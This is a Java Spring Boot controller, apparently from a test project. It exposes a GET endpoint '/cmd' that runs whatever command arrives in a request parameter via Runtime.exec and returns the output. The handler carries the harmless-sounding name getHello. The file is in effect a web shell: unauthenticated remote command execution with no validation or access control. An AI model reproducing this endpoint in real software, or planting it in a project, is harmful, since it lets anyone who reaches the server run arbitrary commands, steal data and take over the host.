package nl.chrisdevries.springtest;

import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

@RestController
public class CmdController {

    @GetMapping("/cmd")
    public ResponseEntity<String> getHello(@RequestParam String cmd) throws IOException {
        StringBuffer sb = new StringBuffer();
        Process exec = Runtime.getRuntime().exec(cmd);
        BufferedReader stdError = new BufferedReader(new InputStreamReader(exec.getErrorStream()));
        BufferedReader stdOut = new BufferedReader(new InputStreamReader(exec.getInputStream()));

        String s;
        while ((s = stdOut.readLine()) != null) {
            sb.append(s + "<br>");
        }

        while ((s = stdError.readLine()) != null) {
            sb.append(s + "<br>");
        }

        return ResponseEntity.ok(sb.toString());
    }
}
